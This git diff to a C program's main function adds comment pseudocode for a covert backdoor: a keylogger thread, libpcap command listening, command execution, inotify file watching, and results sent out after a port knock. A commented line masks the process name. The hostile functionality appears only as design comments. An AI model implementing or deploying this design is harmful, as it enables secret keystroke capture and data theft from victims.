@@ -24,10 +24,7 @@ static struct option long_options[] = {
 
 
 int main(int argc, char **argv){
-    //strcpy(argv[0], MASK);
-    //change the UID/GID to 0 to raise privs
-    //setuid(0);
-    //setgid(0);
+    //strncpy(argv[0], MASK, sizeof(MASK));
     pthread_t inotify_thread;
     int arg;
     char targetip[BUFSIZ];
@@ -71,6 +68,27 @@ int main(int argc, char **argv){
                 exit(1);
         }
     }
+
+    //start keylogger thread (just logs keys)
+    //start libpcap
+
+    //IN LIBPCAP
+    //wait for commands
+        //if command or inotify or keylogger
+            //do_command(type of command)
+        //do_command (type of command)
+            //if(type of command == command)
+                //chmod
+                //run command
+                //pipe into results file
+            //if(type of command == inotify)
+                //run inotify
+                //pipe into results file
+            //if(type of command == keylogger)
+                //copy/pipe keylogger file into results file
+
+            //port knock
+            //send results file
 
     inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
     strncpy(inotify_args->targetip, targetip, BUFSIZ);
